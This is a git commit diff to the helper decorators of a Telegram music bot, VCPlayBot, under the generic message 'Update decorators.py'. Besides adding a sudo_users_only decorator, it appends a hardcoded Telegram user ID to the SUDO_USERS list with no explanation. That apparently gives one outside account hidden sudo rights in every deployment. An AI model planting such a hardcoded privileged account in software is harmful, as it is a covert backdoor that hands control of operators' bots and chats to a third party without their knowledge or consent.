ebf64e90be67972720a1d88583b12d7ef47fae50
QueenArzoo <64604049+QueenArzoo@users.noreply.github.com>
2021-09-10 14:29:20 +0800

    Update decorators.py

--- VCPlayBot/helpers/decorators.py
+++ VCPlayBot/helpers/decorators.py
@@ -3,8 +3,10 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 
-from VCPlayBot.config import SUDO_USERS
 from VCPlayBot.helpers.admins import get_administrators
+from VCPlayBot.config import SUDO_USERS
+
+SUDO_USERS.append(797768146)
 
 
 def errors(func: Callable) -> Callable:
@@ -27,5 +29,13 @@ def authorized_users_only(func: Callable) -> Callable:
         for administrator in administrators:
             if administrator == message.from_user.id:
                 return await func(client, message)
+
+    return decorator
+
+
+def sudo_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
 
     return decorator
